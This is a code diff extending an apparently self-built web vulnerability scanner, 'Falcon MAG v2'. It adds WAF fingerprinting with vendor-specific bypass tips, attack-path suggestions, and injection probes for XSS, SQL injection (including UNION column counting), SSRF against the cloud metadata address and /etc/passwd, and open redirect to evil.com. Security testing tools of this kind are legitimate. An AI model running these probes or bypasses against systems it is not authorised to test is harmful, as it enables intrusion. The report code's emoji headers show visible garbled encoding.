+    ("Alibaba Cloud WAF", ["ali-cdn-real-ip", "eagleeye-traceid"], ["tengine", "alibaba"], []),
+    ("Tencent Cloud WAF", ["x-nws-log-uuid"], ["tencent"], []),
+    ("Huawei Cloud WAF", [], ["hw-waf", "huawei"], []),
+    ("360 WAF", [], ["360wzws", "wangzhan"], ["wzws_sessionid"]),
+    ("SafeDog", [], ["safedog"], ["safedog-flow-item"]),
+    ("Yunsuo", [], ["yunsuo"], ["yunsuo_session"]),
+    ("DDoS-GUARD", [], ["ddos-guard"], ["__ddg"]),
+    ("Comodo", [], ["comodo", "cwatch"], []),
+    ("Google Cloud Armor", ["x-cloud-trace-context"], ["google", "gfe"], []),
+]
+
+
+def _waf_match_by_headers(headers_lower, cookies_str):
+    """Passive match: look for known WAF signatures in headers + cookies."""
+    matches = []
+    server = headers_lower.get("server", "").lower()
+    via = headers_lower.get("via", "").lower()
+    for name, header_keys, server_keys, cookie_prefixes in WAF_SIGNATURES:
+        signals = []
+        for hk in header_keys:
+            if hk in headers_lower:
+                signals.append(f"header:{hk}")
+        for sk in server_keys:
+            if sk in server or sk in via:
+                signals.append(f"server:{sk}")
+        for cp in cookie_prefixes:
+            if cp.lower() in cookies_str.lower():
+                signals.append(f"cookie:{cp}")
+        if signals:
+            matches.append({"name": name, "signals": signals})
+    return matches
+
+
+async def test_waf_advanced(pool, target, active_probe=True):
+    """Comprehensive WAF detection + fingerprinting + strictness analysis.
+
+    Args:
+        pool: HttpPool
+        target: URL
+        active_probe: send test payloads (uses ~6 requests)
+
+    Returns: rich dict with waf, strictness, bypass_suggestions, etc.
+    """
+    result = {
+        "target": target,
+        "detected": False,
+        "waf": None,
+        "all_candidates": [],
+        "signals": [],
+        "strictness": None,
+        "blocked_status": None,
+        "bypass_suggestions": [],
+        "server_header": "",
+        "probes_sent": 0,
+    }
+
+    # ── 1. Passive detection ─────────────────────────────
+    resp = await pool.send("GET", target)
+    if not resp or resp.status == 0:
+        result["error"] = "unreachable"
+        return result
+
+    headers_lower = {k.lower(): (v or "") for k, v in (resp.headers or {}).items()}
+    result["server_header"] = headers_lower.get("server", "")
+    cookies_str = headers_lower.get("set-cookie", "")
+
+    candidates = _waf_match_by_headers(headers_lower, cookies_str)
+    # === EXTENDED (Stage 2.D) ===
+    try:
+        ext_candidates = _waf_match_extended(headers_lower, cookies_str, (resp.text or "").lower())
+        for ec in ext_candidates:
+            ec["source"] = ec.get("source", "extended")
+        candidates = candidates + [e for e in ext_candidates if not any(e["name"] == c["name"] for c in candidates)]
+    except Exception:
+        pass
+    # === END EXTENDED ===
+    result["all_candidates"] = candidates
+
+    if candidates:
+        result["detected"] = True
+        result["waf"] = candidates[0]["name"]
+        result["signals"] = candidates[0]["signals"]
+
+    # ── 2. Active probing (optional) ─────────────────────
+    if active_probe and not result["detected"]:
+        # Send a harmless XSS payload and see if it's blocked
+        test_url = target.rstrip("/") + "/?waf_probe=<script>alert(1)</script>"
+        try:
+            probe = await pool.send("GET", test_url)
+            result["probes_sent"] += 1
+            if probe and probe.status in (403, 406, 419, 501, 503):
+                result["detected"] = True
+                result["blocked_status"] = probe.status
+                result["strictness"] = "high"
+                result["signals"].append(f"active:HTTP{probe.status}")
+        except Exception:
+            pass
+
+        # Try SQL quote
+        test_url2 = target.rstrip("/") + "/?waf_probe=1'+OR+'1'='1"
+        try:
+            probe2 = await pool.send("GET", test_url2)
+            result["probes_sent"] += 1
+            if probe2 and probe2.status in (403, 406, 419):
+                result["detected"] = True
+                if not result["blocked_status"]:
+                    result["blocked_status"] = probe2.status
+                if result["strictness"] != "high":
+                    result["strictness"] = "medium"
+        except Exception:
+            pass
+
+    # ── 3. Infer strictness from detection ───────────────
+    if result["detected"] and not result["strictness"]:
+        if result["blocked_status"]:
+            result["strictness"] = "medium"
+        else:
+            result["strictness"] = "low"
+
+    # ── 4. Bypass suggestions ────────────────────────────
+    waf_name = result["waf"] or "unknown"
+    suggestions = {
+        "Cloudflare": ["Mixed case payloads", "Double URL encoding", "Unicode escapes",
+                       "Use chunked encoding", "Try different User-Agents"],
+        "AWS WAF": ["HTML entities", "Mixed case", "SQL comments",
+                    "URL encoding with %XX"],
+        "Akamai": ["Whitespace injection (tabs/newlines)", "Parameter pollution",
+                   "Multiple encoding layers"],
+        "Sucuri": ["Case variation", "Comment injection",
+                   "Alternative XSS vectors (SVG, MathML)"],
+        "Imperva": ["HTTP parameter pollution", "JSON-based payloads",
+                    "Charset manipulation (UTF-16, UTF-7)"],
+        "F5 BIG-IP": ["Chunked transfer", "Null byte injection", "HTTP/2 framing"],
+        "ModSecurity": ["SQL inline comments /*!*/", "Case variation",
+                        "Encoding double", "Buffer overflow probes"],
+        "Wordfence": ["Skip login endpoints", "Custom REST endpoints",
+                      "XML-RPC bypass"],
+        "Barracuda": ["URL encoding", "Case variation", "Comment injection"],
+    }
+    result["bypass_suggestions"] = suggestions.get(waf_name, [
+        "Try mixed case payloads", "Try URL encoding",
+        "Try double encoding", "Try chunked transfer",
+    ])
+
+    log.info("waf_advanced_complete",
+             detected=result["detected"],
+             waf=result["waf"],
+             strictness=result["strictness"],
+             candidates=len(candidates),
+             probes=result["probes_sent"])
+    return result
+
+
+async def waf_advanced_from_config(pool, config):
+    """Wrapper: extract target and store result in config."""
+    target = config.get("target", "")
+    if not target:
+        return None
+    result = await test_waf_advanced(pool, target, active_probe=True)
+    config["_waf_advanced"] = result
+    return result
+
+
+# END WAF ADVANCED
+
+
+async def test_db_fingerprint(pool, target):
+    """Advanced DB fingerprinting."""
+    import re as _re
+    result = {
+        "target": target,
+        "db_hints": [],
+        "version_hints": [],
+        "connection_strings": [],
+        "findings": [],
+        "vulnerable": [],
+    }
+    resp = await pool.send("GET", target)
+    if not resp or resp.status == 0:
+        result["error"] = "unreachable"
+        return result
+    body = (resp.text or "")
+    body_lower = body.lower()
+    DB_PATTERNS = {
+        "MySQL": [r"mysql_", r"mysqli", r"sql syntax.*mysql", r"warning.*mysql"],
+        "PostgreSQL": [r"postgresql", r"pg_query", r"pg_exec", r"sqlstate\["],
+        "MSSQL": [r"microsoft sql server", r"odbc sql server", r"sqlserver"],
+        "Oracle": [r"ora-\d{4,5}", r"oracle.*driver"],
+        "MongoDB": [r"mongodb", r"mongo error", r"bson"],
+        "SQLite": [r"sqlite", r"operationalerror"],
+        "Redis": [r"redis", r"err_client"],
+    }
+    for db, patterns in DB_PATTERNS.items():
+        for p in patterns:
+            if _re.search(p, body_lower):
+                result["db_hints"].append(db)
+                break
+    VERSION_PATTERNS = [
+        (r"mysql (\d+\.\d+\.\d+)", "MySQL"),
+        (r"postgresql (\d+\.\d+)", "PostgreSQL"),
+        (r"microsoft sql server (\d+)", "MSSQL"),
+        (r"mongodb (\d+\.\d+)", "MongoDB"),
+    ]
+    for pat, db in VERSION_PATTERNS:
+        m = _re.search(pat, body_lower)
+        if m:
+            result["version_hints"].append({"db": db, "version": m.group(1)})
+    CONN_PATTERNS = [
+        r"mysql://[^\s\"\x27<>]+",
+        r"postgres(?:ql)?://[^\s\"\x27<>]+",
+        r"mongodb(?:\+srv)?://[^\s\"\x27<>]+",
+        r"redis://[^\s\"\x27<>]+",
+        r"jdbc:[a-z]+://[^\s\"\x27<>]+",
+    ]
+    for pat in CONN_PATTERNS:
+        matches = _re.findall(pat, body, _re.IGNORECASE)
+        for m in matches[:3]:
+            if m not in result["connection_strings"]:
+                result["connection_strings"].append(m[:200])
+    for conn in result["connection_strings"][:3]:
+        result["findings"].append({
+            "vuln_class": "db_fingerprint",
+            "subtype": "connection_string_leak",
+            "severity": "critical",
+            "url": target,
+            "param": "",
+            "payload": conn[:100],
+            "evidence": "DB connection string exposed",
+            "confidence": 0.85,
+        })
+    result["vulnerable"] = result["findings"]
+    log.info("db_fingerprint_complete",
+             db_hints=len(result["db_hints"]),
+             conn_strings=len(result["connection_strings"]))
+    return result
+
+
+async def attack_suggestions_from_fingerprint(pool, config):
+    """Generate attack suggestions."""
+    target = config.get("target", "")
+    fp = config.get("_fingerprint_advanced", {}) or {}
+    waf_adv = config.get("_waf_advanced", {}) or {}
+    suggestions = {"target": target, "paths": [], "vectors": [], "notes": []}
+    cms = (fp.get("cms") or "").lower()
+    fw = (fp.get("framework") or "").lower()
+    lang = (fp.get("language") or "").lower()
+    server = (fp.get("server") or "").lower()
+    waf = (waf_adv.get("waf") or "").lower()
+    if "wordpress" in cms:
+        suggestions["paths"].extend(["/wp-admin", "/wp-login.php", "/xmlrpc.php",
+                                     "/wp-json/wp/v2/users", "/?author=1"])
+        suggestions["vectors"].append("WordPress plugin CVEs")
+        suggestions["vectors"].append("XML-RPC brute force")
+        suggestions["notes"].append("Check user enumeration via ?author=1")
+    elif "joomla" in cms:
+        suggestions["paths"].extend(["/administrator", "/components/com_users",
+                                     "/configuration.php~"])
+        suggestions["vectors"].append("Joomla component SQLi")
+    elif "drupal" in cms:
+        suggestions["paths"].extend(["/user/login", "/admin", "/CHANGELOG.txt"])
+        suggestions["vectors"].append("Drupalgeddon RCE")
+    if "next.js" in fw or "nextjs" in fw:
+        suggestions["paths"].extend(["/_next/data", "/api/", "/_next/static/"])
+        suggestions["vectors"].append("Next.js middleware bypass")
+        suggestions["vectors"].append("RSC data leakage")
+    elif "laravel" in fw:
+        suggestions["paths"].extend(["/.env", "/telescope", "/_ignition/health-check"])
+        suggestions["vectors"].append("Laravel debug mode RCE")
+    elif "django" in fw:
+        suggestions["paths"].extend(["/admin/", "/api/", "/static/admin/"])
+        suggestions["vectors"].append("Django debug page leak")
+    if "php" in lang:
+        suggestions["paths"].extend(["/phpinfo.php", "/info.php"])
+    elif "asp.net" in lang:
+        suggestions["paths"].extend(["/web.config", "/trace.axd", "/elmah.axd"])
+    elif "python" in lang:
+        suggestions["paths"].extend(["/__debug__", "/.git/HEAD"])
+    if "nginx" in server:
+        suggestions["paths"].extend(["/nginx_status", "/status"])
+    elif "apache" in server:
+        suggestions["paths"].extend(["/server-status", "/server-info"])
+    elif "iis" in server:
+        suggestions["paths"].extend(["/iisstart.htm", "/web.config"])
+    if "cloudflare" in waf:
+        suggestions["notes"].append("Cloudflare detected: try direct origin IP")
+        suggestions["notes"].append("Use HTTP/2 or chunked transfer to bypass")
+    elif "aws waf" in waf:
+        suggestions["notes"].append("AWS WAF: try URL/HTML encoding layers")
+    elif "imperva" in waf:
+        suggestions["notes"].append("Imperva: try charset manipulation")
+    suggestions["paths"] = list(dict.fromkeys(suggestions["paths"]))
+    suggestions["vectors"] = list(dict.fromkeys(suggestions["vectors"]))
+    suggestions["notes"] = list(dict.fromkeys(suggestions["notes"]))
+    log.info("attack_suggestions_complete",
+             paths=len(suggestions["paths"]),
+             vectors=len(suggestions["vectors"]))
+    return suggestions
+
+
+class MetricsCollector:
+    """Track scan metrics for performance analysis."""
+
+    def __init__(self):
+        import time as _time
+        self.start_time = _time.time()
+        self.metrics = {}
+        self.counters = {}
+
+    def inc(self, key, amount=1):
+        self.counters[key] = self.counters.get(key, 0) + amount
+
+    def record(self, key, value):
+        if key not in self.metrics:
+            self.metrics[key] = []
+        self.metrics[key].append(value)
+
+    def snapshot(self):
+        import time as _time
+        return {
+            "elapsed": round(_time.time() - self.start_time, 2),
+            "counters": dict(self.counters),
+            "metrics": {k: {"count": len(v), "avg": round(sum(v)/len(v), 2) if v else 0}
+                        for k, v in self.metrics.items()},
+        }
 
 async def detect_waf(pool, url):
     resp = await pool.send("GET", url + "/?test=<script>alert(1)</script>")
@@ -458,7 +1575,7 @@ def render_report(findings, summary, output_dir="reports"):
     # ============================================================
     # HEADER
     # ============================================================
-    lines.append("# 🦅 Falcon MAG — Full Scan Report")
+    lines.append("# ðŸ¦… Falcon MAG â€” Full Scan Report")
     lines.append("")
     lines.append(f"**Scan ID:** #{scan_id}")
     lines.append(f"**Target:** `{target}`")
@@ -473,7 +1590,7 @@ def render_report(findings, summary, output_dir="reports"):
     # ============================================================
     # EXECUTIVE SUMMARY
     # ============================================================
-    lines.append("## 📋 Executive Summary")
+    lines.append("## ðŸ“‹ Executive Summary")
     lines.append("")
 
     sev_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
@@ -485,13 +1602,13 @@ def render_report(findings, summary, output_dir="reports"):
     lines.append(f"| Metric | Value |")
     lines.append(f"|--------|-------|")
     lines.append(f"| Total Findings | **{len(findings)}** |")
-    lines.append(f"| Critical | 🔴 {sev_counts['critical']} |")
-    lines.append(f"| High | 🟠 {sev_counts['high']} |")
-    lines.append(f"| Medium | 🟡 {sev_counts['medium']} |")
-    lines.append(f"| Low | 🟢 {sev_counts['low']} |")
-    lines.append(f"| Info | 🔵 {sev_counts['info']} |")
+    lines.append(f"| Critical | ðŸ”´ {sev_counts['critical']} |")
+    lines.append(f"| High | ðŸŸ  {sev_counts['high']} |")
+    lines.append(f"| Medium | ðŸŸ¡ {sev_counts['medium']} |")
+    lines.append(f"| Low | ðŸŸ¢ {sev_counts['low']} |")
+    lines.append(f"| Info | ðŸ”µ {sev_counts['info']} |")
     lines.append(f"| Hidden Paths Found | {len(hidden_paths)} |")
-    lines.append(f"| WAF Detected | {'Yes — ' + waf if waf else 'No'} |")
+    lines.append(f"| WAF Detected | {'Yes â€” ' + waf if waf else 'No'} |")
     lines.append("")
 
     # ============================================================
@@ -500,7 +1617,7 @@ def render_report(findings, summary, output_dir="reports"):
     if ai_plan:
         lines.append("---")
         lines.append("")
-        lines.append("## 🧠 AI Analysis (DeepSeek)")
+        lines.append("## ðŸ§  AI Analysis (DeepSeek)")
         lines.append("")
 
         risk_level = ai_plan.get("risk_level")
@@ -579,7 +1696,7 @@ def render_report(findings, summary, output_dir="reports"):
     if hidden_paths:
         lines.append("---")
         lines.append("")
-        lines.append(f"## 🗺️ Hidden Paths Discovered ({len(hidden_paths)})")
+        lines.append(f"## ðŸ—ºï¸ Hidden Paths Discovered ({len(hidden_paths)})")
         lines.append("")
         lines.append("| Path | Status | Size | Type |")
         lines.append("|------|--------|------|------|")
@@ -599,7 +1716,7 @@ def render_report(findings, summary, output_dir="reports"):
     if fingerprint:
         lines.append("---")
         lines.append("")
-        lines.append("## 🔍 Fingerprint")
+        lines.append("## ðŸ” Fingerprint")
         lines.append("")
         lines.append(f"- **Server:** `{fingerprint.get('server', 'N/A')}`")
         lines.append(f"- **Powered By:** `{fingerprint.get('powered_by', 'N/A')}`")
@@ -614,7 +1731,7 @@ def render_report(findings, summary, output_dir="reports"):
     if waf:
         lines.append("---")
         lines.append("")
-        lines.append(f"## 🛡️ WAF Detected: {waf}")
+        lines.append(f"## ðŸ›¡ï¸ WAF Detected: {waf}")
         lines.append("")
         if waf_info.get("triggered_probes") is not None:
             lines.append(f"- **Probes Triggered:** {waf_info.get('triggered_probes')}/{waf_info.get('probes_sent', '?')}")
@@ -628,7 +1745,7 @@ def render_report(findings, summary, output_dir="reports"):
     # ============================================================
     lines.append("---")
     lines.append("")
-    lines.append(f"## 🔴 Findings ({len(findings)})")
+    lines.append(f"## ðŸ”´ Findings ({len(findings)})")
     lines.append("")
 
     if not findings:
@@ -668,12 +1785,107 @@ def render_report(findings, summary, output_dir="reports"):
             lines.append("")
 
     # ============================================================
+    # SITE MAP (Fingerprint Advanced) - Stage 2.B5
+    fp_adv = summary.get("_fingerprint_advanced") or {}
+    if fp_adv and fp_adv.get("technologies"):
+        lines.append("---")
+        lines.append("")
+        lines.append("## SITE MAP (Fingerprint Advanced)")
+        lines.append("")
+        lines.append(f"- **Server:** `{fp_adv.get('server', 'N/A')}`")
+        lines.append(f"- **Powered-By:** `{fp_adv.get('powered_by', 'N/A')}`")
+        lines.append(f"- **Language:** `{fp_adv.get('language', 'N/A')}`")
+        lines.append(f"- **Framework:** `{fp_adv.get('framework', 'N/A')}`")
+        lines.append(f"- **CMS:** `{fp_adv.get('cms', 'N/A')}`")
+        lines.append(f"- **WAF:** `{fp_adv.get('waf') or 'None'}`")
+        techs = fp_adv.get("technologies", [])
+        if techs:
+            lines.append(f"- **Technologies ({len(techs)}):** {', '.join(techs)}")
+        js_libs = fp_adv.get("js_libs", [])
+        if js_libs:
+            lines.append(f"- **JS Libraries:** {', '.join(js_libs)}")
+        db_hints = fp_adv.get("db_hints", [])
+        if db_hints:
+            lines.append(f"- **DB Hints:** {', '.join(db_hints)}")
+        cookies = fp_adv.get("cookies", [])
+        if cookies:
+            lines.append(f"- **Cookies ({len(cookies)}):** {', '.join(c['name'] for c in cookies[:5])}")
+        missing = fp_adv.get("missing_headers", [])
+        if missing:
+            lines.append(f"- **Missing Security Headers:** {len(missing)}")
+        lines.append("")
+    # END SITE MAP
+
+    # WAF DETAILS (Stage 2.D v2)
+    waf_adv = summary.get("_waf_advanced") or {}
+    if waf_adv and waf_adv.get("detected"):
+        lines.append("---")
+        lines.append("")
+        lines.append("## WAF DETECTED")
+        lines.append("")
+        lines.append("- **WAF:** `" + str(waf_adv.get("waf", "Unknown")) + "`")
+        lines.append("- **Strictness:** `" + str(waf_adv.get("strictness", "N/A")) + "`")
+        signals = waf_adv.get("signals", [])
+        if signals:
+            lines.append("- **Signals (" + str(len(signals)) + "):** " + ", ".join(signals[:5]))
+        bs = waf_adv.get("bypass_suggestions", [])
+        if bs:
+            lines.append("")
+            lines.append("### Bypass Suggestions")
+            for s in bs[:10]:
+                lines.append("- " + str(s))
+        lines.append("")
+    # END WAF DETAILS
+
+    # DB FINGERPRINT (Stage 2.D v2)
+    db_fp = summary.get("_db_fingerprint") or {}
+    if db_fp and db_fp.get("db_hints"):
+        lines.append("---")
+        lines.append("")
+        lines.append("## DB FINGERPRINT")
+        lines.append("")
+        lines.append("- **DB Hints:** " + ", ".join(db_fp.get("db_hints", [])))
+        vh = db_fp.get("version_hints") or []
+        if vh:
+            lines.append("- **Version Hints:**")
+            for v in vh[:5]:
+                lines.append("  - " + str(v.get("db")) + ": " + str(v.get("version")))
+        cs = db_fp.get("connection_strings") or []
+        if cs:
+            lines.append("- **Connection Strings Leaked:** " + str(len(cs)))
+        lines.append("")
+    # END DB FINGERPRINT
+
+    # ATTACK SUGGESTIONS (Stage 2.D v2)
+    suggestions = summary.get("_attack_suggestions") or {}
+    if suggestions and (suggestions.get("paths") or suggestions.get("vectors")):
+        lines.append("---")
+        lines.append("")
+        lines.append("## ATTACK SUGGESTIONS")
+        lines.append("")
+        if suggestions.get("paths"):
+            lines.append("### Suggested Paths")
+            for p in suggestions["paths"][:20]:
+                lines.append("- `" + str(p) + "`")
+            lines.append("")
+        if suggestions.get("vectors"):
+            lines.append("### Suggested Vectors")
+            for v in suggestions["vectors"][:10]:
+                lines.append("- " + str(v))
+            lines.append("")
+        if suggestions.get("notes"):
+            lines.append("### Notes")
+            for n in suggestions["notes"][:10]:
+                lines.append("- " + str(n))
+            lines.append("")
+    # END ATTACK SUGGESTIONS
+
     # CRAWL SUMMARY
     # ============================================================
     if crawl:
         lines.append("---")
         lines.append("")
-        lines.append("## 🕷️ Crawl Summary")
+        lines.append("## ðŸ•·ï¸ Crawl Summary")
         lines.append("")
         lines.append(f"- **Pages Visited:** {crawl.get('pages_visited', 0)}")
         lines.append(f"- **Endpoints Found:** {len(crawl.get('endpoints', []))}")
@@ -686,7 +1898,7 @@ def render_report(findings, summary, output_dir="reports"):
     # ============================================================
     lines.append("---")
     lines.append("")
-    lines.append(f"*Generated by Falcon MAG v2 — {_dt.now().strftime('%Y-%m-%d %H:%M:%S')}*")
+    lines.append(f"*Generated by Falcon MAG v2 â€” {_dt.now().strftime('%Y-%m-%d %H:%M:%S')}*")
 
     content = "\n".join(lines)
     with open(path, "w", encoding="utf-8") as fh:
@@ -699,38 +1911,805 @@ def render_report(findings, summary, output_dir="reports"):
 # ============================================================
 
 async def test_xss(pool, endpoint, params, payloads=None):
-    """Test for reflected XSS."""
+    """Test for reflected XSS (uses framework helpers)."""
+    from framework_bridge import (
+        XSS_PAYLOADS, xss_verify_reflection, xss_find_context, xss_inject_param,
+    )
+
     if payloads is None:
-        payloads = [
-            "<script>alert(1)</script>",
-            "\"><script>alert(1)</script>",
-            "<img src=x onerror=alert(1)>",
-            "<svg onload=alert(1)>",
-            "javascript:alert(1)",
-        ]
+        payloads = XSS_PAYLOADS
+
     findings = []
     for param in params:
         for payload in payloads:
-            test_url = f"{endpoint}?{param}={payload}"
+            test_url = xss_inject_param(endpoint, param, payload)
             resp = await pool.send("GET", test_url)
             if resp.status == 0:
                 continue
-            body = resp.text
-            if payload in body:
+
+            body = resp.text or ""
+            if not xss_verify_reflection(body, payload):
+                continue
+
+            ctx = xss_find_context(body, payload) or {}
+
+            findings.append({
+                "vuln_class": "xss",
+                "subtype": "reflected",
+                "severity": "high",
+                "url": endpoint,
+                "injected_url": test_url,
+                "param": param,
+                "payload": payload,
+                "context_type": ctx.get("type", "html"),
+                "context_before": ctx.get("before", ""),
+                "context_after": ctx.get("after", ""),
+                "evidence": body[:500],
+                "confidence": 0.9,
+            })
+            log.info("xss_found", endpoint=endpoint, param=param,
+                     payload=payload[:50])
+            break  # اكفِ بهذا param
+    return findings
+
+
+# === POST XSS SUPPORT (Stage 2.B1) ===
+async def test_xss_post(pool, endpoint, params, post_data="", post_json="",
+                        method="POST", content_type=None):
+    """Test for reflected XSS in POST body (form-encoded or JSON)."""
+    from framework_bridge import (
+        XSS_PAYLOADS, xss_verify_reflection, xss_find_context,
+    )
+    from urllib.parse import urlencode, parse_qs
+    import json as _json
+
+    findings = []
+    if not params:
+        return findings
+
+    payloads = XSS_PAYLOADS
+
+    for param in params:
+        for payload in payloads:
+            try:
+                if post_json:
+                    body_obj = _json.loads(post_json)
+                    if not isinstance(body_obj, dict):
+                        body_obj = {}
+                    body_obj[param] = payload
+                    kwargs = {"json": body_obj}
+                    effective_ct = "application/json"
+                elif post_data:
+                    parsed = parse_qs(post_data, keep_blank_values=True)
+                    parsed[param] = [payload]
+                    new_body = urlencode(parsed, doseq=True)
+                    kwargs = {"content": new_body}
+                    effective_ct = content_type or "application/x-www-form-urlencoded"
+                else:
+                    kwargs = {"data": {param: payload}}
+                    effective_ct = "application/x-www-form-urlencoded"
+
+                headers = kwargs.pop("headers", {})
+                headers["Content-Type"] = effective_ct
+                kwargs["headers"] = headers
+
+                resp = await pool.send(method, endpoint, **kwargs)
+                if resp.status == 0:
+                    continue
+
+                body = resp.text or ""
+                if not xss_verify_reflection(body, payload):
+                    continue
+
+                ctx = xss_find_context(body, payload) or {}
+
                 findings.append({
                     "vuln_class": "xss",
-                    "subtype": "reflected",
+                    "subtype": "reflected_post",
                     "severity": "high",
                     "url": endpoint,
+                    "injected_url": endpoint,
                     "param": param,
                     "payload": payload,
+                    "method": method,
+                    "content_type": effective_ct,
+                    "context_type": ctx.get("type", "html"),
+                    "context_before": ctx.get("before", ""),
+                    "context_after": ctx.get("after", ""),
                     "evidence": body[:500],
-                    "confidence": 0.85,
+                    "confidence": 0.9,
                 })
-                log.info("xss_found", endpoint=endpoint, param=param, payload=payload[:50])
+                log.info("xss_post_found", endpoint=endpoint, param=param,
+                         method=method, payload=payload[:50])
+                break
+            except Exception as _e:
+                log.debug("xss_post_failed", param=param, error=str(_e))
+                continue
+    return findings
+
+
+async def test_xss_post_from_config(pool, config):
+    """Wrapper: extract POST forms from config and run test_xss_post."""
+    findings = []
+    forms = config.get("_crawl_forms_post", []) or []
+    if not forms:
+        return findings
+
+    for form in forms[:5]:
+        action = form.get("action", "")
+        body = form.get("body", "")
+        fields = form.get("fields", []) or []
+        if not action or not fields:
+            continue
+
+        post_json = ""
+        post_data = ""
+        if body.strip().startswith("{"):
+            post_json = body
+        else:
+            post_data = body
+
+        sub = await test_xss_post(
+            pool, action, fields,
+            post_data=post_data,
+            post_json=post_json,
+            method="POST",
+        )
+        findings.extend(sub)
+    return findings
+
+# === END POST XSS SUPPORT ===
+
+async def test_sqli_post(pool, endpoint, params, post_data="", post_json=""):
+    """Test SQL injection in POST body."""
+    from framework_bridge import (
+        SQLI_ERROR_PAYLOADS, sqli_has_db_error, sqli_looks_like_error,
+    )
+    from urllib.parse import urlencode, parse_qs
+    import json as _json
+    findings = []
+    if not params:
+        return findings
+    for param in params:
+        for payload in SQLI_ERROR_PAYLOADS:
+            try:
+                if post_json:
+                    body_obj = _json.loads(post_json)
+                    if not isinstance(body_obj, dict):
+                        body_obj = {}
+                    body_obj[param] = payload
+                    resp = await pool.send("POST", endpoint, json=body_obj,
+                        headers={"Content-Type": "application/json"})
+                elif post_data:
+                    parsed = parse_qs(post_data, keep_blank_values=True)
+                    parsed[param] = [payload]
+                    new_body = urlencode(parsed, doseq=True)
+                    resp = await pool.send("POST", endpoint, content=new_body,
+                        headers={"Content-Type": "application/x-www-form-urlencoded"})
+                else:
+                    resp = await pool.send("POST", endpoint,
+                        data={param: payload})
+            except Exception as _e:
+                log.debug("sqli_post_failed", param=param, error=str(_e))
+                continue
+            if not resp or resp.status == 0:
+                continue
+            body = resp.text or ""
+            sig = sqli_has_db_error(body)
+            if not sig and resp.status == 500 and sqli_looks_like_error(body):
+                sig = "HTTP 500"
+            if sig:
+                findings.append({
+                    "vuln_class": "sqli",
+                    "subtype": "post_error_based",
+                    "severity": "critical",
+                    "url": endpoint,
+                    "injected_url": endpoint,
+                    "param": param,
+                    "payload": payload,
+                    "method": "POST",
+                    "db_error": sig,
+                    "evidence": body[:500],
+                    "confidence": 0.9,
+                })
+                log.info("sqli_post_found", endpoint=endpoint, param=param)
                 break
     return findings
 
+
+async def test_ssrf_post(pool, endpoint, params, post_data="", post_json=""):
+    """Test SSRF in POST body."""
+    from urllib.parse import urlencode, parse_qs
+    import json as _json
+    findings = []
+    if not params:
+        return findings
+    ssrf_payloads = [
+        "http://127.0.0.1:80",
+        "http://localhost",
+        "http://169.254.169.254/latest/meta-data/",
+        "file:///etc/passwd",
+    ]
+    for param in params:
+        for payload in ssrf_payloads:
+            try:
+                if post_json:
+                    body_obj = _json.loads(post_json)
+                    if not isinstance(body_obj, dict):
+                        body_obj = {}
+                    body_obj[param] = payload
+                    resp = await pool.send("POST", endpoint, json=body_obj,
+                        headers={"Content-Type": "application/json"})
+                elif post_data:
+                    parsed = parse_qs(post_data, keep_blank_values=True)
+                    parsed[param] = [payload]
+                    new_body = urlencode(parsed, doseq=True)
+                    resp = await pool.send("POST", endpoint, content=new_body,
+                        headers={"Content-Type": "application/x-www-form-urlencoded"})
+                else:
+                    resp = await pool.send("POST", endpoint,
+                        data={param: payload})
+            except Exception as _e:
+                log.debug("ssrf_post_failed", param=param, error=str(_e))
+                continue
+            if not resp or resp.status == 0:
+                continue
+            body_low = (resp.text or "").lower()
+            if any(m in body_low for m in ["aws", "metadata", "root:", "instance-id"]):
+                findings.append({
+                    "vuln_class": "ssrf",
+                    "subtype": "post_ssrf",
+                    "severity": "critical",
+                    "url": endpoint,
+                    "injected_url": endpoint,
+                    "param": param,
+                    "payload": payload,
+                    "method": "POST",
+                    "evidence": (resp.text or "")[:500],
+                    "confidence": 0.85,
+                })
+                log.info("ssrf_post_found", endpoint=endpoint, param=param)
+                break
+    return findings
+
+
+async def test_open_redirect_post(pool, endpoint, params, post_data="", post_json=""):
+    """Test open redirect in POST body."""
+    from urllib.parse import urlencode, parse_qs
+    import json as _json
+    findings = []
+    if not params:
+        return findings
+    redirect_payloads = [
+        "https://evil.com",
+        "//evil.com",
+        "https://google.com",
+    ]
+    for param in params:
+        for payload in redirect_payloads:
+            try:
+                if post_json:
+                    body_obj = _json.loads(post_json)
+                    if not isinstance(body_obj, dict):
+                        body_obj = {}
+                    body_obj[param] = payload
+                    resp = await pool.send("POST", endpoint, json=body_obj,
+                        headers={"Content-Type": "application/json"})
+                elif post_data:
+                    parsed = parse_qs(post_data, keep_blank_values=True)
+                    parsed[param] = [payload]
+                    new_body = urlencode(parsed, doseq=True)
+                    resp = await pool.send("POST", endpoint, content=new_body,
+                        headers={"Content-Type": "application/x-www-form-urlencoded"})
+                else:
+                    resp = await pool.send("POST", endpoint,
+                        data={param: payload})
+            except Exception as _e:
+                log.debug("redirect_post_failed", param=param, error=str(_e))
+                continue
+            if not resp or resp.status == 0:
+                continue
+            if resp.status in (301, 302, 303, 307, 308):
+                location = (resp.headers or {}).get("location", "")
+                if "evil.com" in location or "google.com" in location:
+                    findings.append({
+                        "vuln_class": "open_redirect",
+                        "subtype": "post_redirect",
+                        "severity": "medium",
+                        "url": endpoint,
+                        "injected_url": endpoint,
+                        "param": param,
+                        "payload": payload,
+                        "method": "POST",
+                        "evidence": "Redirects to: " + location,
+                        "confidence": 0.9,
+                    })
+                    log.info("redirect_post_found", endpoint=endpoint, param=param)
+                    break
+    return findings
+
+
+async def test_sqli_union(pool, endpoint, params):
+    """Union-based SQLi detection."""
+    from urllib.parse import quote
+    findings = []
+    if not params:
+        return findings
+    # Try increasing column counts 1..10
+    for param in params:
+        for cols in range(1, 11):
+            nulls = ",".join(["NULL"] * cols)
+            payload = "1' UNION SELECT " + nulls + "-- -"
+            try:
+                test_url = endpoint + "?" + param + "=" + quote(payload, safe="")
+                resp = await pool.send("GET", test_url)
+            except Exception:
+                continue
+            if not resp or resp.status == 0:
+                continue
+            body = (resp.text or "").lower()
+            # Check for hints that union succeeded
+            hints = ["column", "union", "select", "syntax error"]
+            if any(h in body for h in hints):
+                # Baseline: same request with wrong column count
+                wrong_payload = "1' UNION SELECT " + ",".join(["NULL"] * (cols + 5)) + "-- -"
+                wrong_url = endpoint + "?" + param + "=" + quote(wrong_payload, safe="")
+                try:
+                    wrong_resp = await pool.send("GET", wrong_url)
+                except Exception:
+                    continue
+                # If the wrong count returns error but right count succeeds -> detection
+                right_has_error = "syntax error" in body
+                wrong_body = (wrong_resp.text or "").lower() if wrong_resp else ""
+                wrong_has_error = "syntax error" in wrong_body
